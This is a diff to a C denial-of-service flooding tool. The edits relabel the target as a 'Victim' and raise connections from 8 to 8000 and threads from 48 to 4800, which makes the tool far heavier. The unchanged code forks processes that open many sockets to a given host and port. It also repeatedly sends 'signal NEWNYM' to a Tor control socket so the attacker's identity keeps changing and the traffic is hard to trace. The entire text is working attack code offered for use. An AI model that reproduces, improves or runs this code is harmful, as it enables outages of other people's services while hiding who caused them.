@@ -36,12 +36,12 @@ int make_socket(char *host, char *port) {
 	if(p == NULL) {
 		if(servinfo)
 			freeaddrinfo(servinfo);
-		fprintf(stderr, "No connection could be made\n");
+		fprintf(stderr, "No connection could be made Mybe UseR Has Down\n");
 		exit(0);
 	}
 	if(servinfo)
 		freeaddrinfo(servinfo);
-	fprintf(stderr, "[Connected -> %s:%s]\n", host, port);
+	fprintf(stderr, "[Connected To Victim-> %s:%s]\n", host, port);
 	return sock;
 }
 
@@ -49,8 +49,8 @@ void broke(int s) {
 	// do nothing
 }
 
-#define CONNECTIONS 8
-#define THREADS 48
+#define CONNECTIONS 8000
+#define THREADS 4800
 
 void attack(char *host, char *port, int id) {
 	int sockets[CONNECTIONS];
@@ -68,10 +68,10 @@ void attack(char *host, char *port, int id) {
 				sockets[x] = make_socket(host, port);
 			} else
 //				fprintf(stderr, "Socket[%i->%i] -> %i\n", x, sockets[x], r);
-			fprintf(stderr, "[%i: Voly Sent]\n", id);
+			fprintf(stderr, "[%i: Voly Pacakge Sent]\n", id);
 		}
-		fprintf(stderr, "[%i: Voly Sent]\n", id);
-		usleep(300000);
+		fprintf(stderr, "[%i: Voly Pacakge Sent]\n", id);
+		usleep(900000);
 	}
 }
 
@@ -82,7 +82,7 @@ void cycle_identity() {
 	while(1) {
 		r=write(socket, "signal NEWNYM\n\x00", 16);
 		fprintf(stderr, "[%i: cycle_identity -> signal NEWNYM\n", r);
-		usleep(300000);
+		usleep(900000);
 	}
 }
 
@@ -93,8 +93,8 @@ int main(int argc, char **argv) {
 	for(x=0; x != THREADS; x++) {
 		if(fork())
 			attack(argv[1], argv[2], x);
-		usleep(200000);
-	}
+		usleep(900000);
+	}               
 	getc(stdin);
 	return 0;
 }
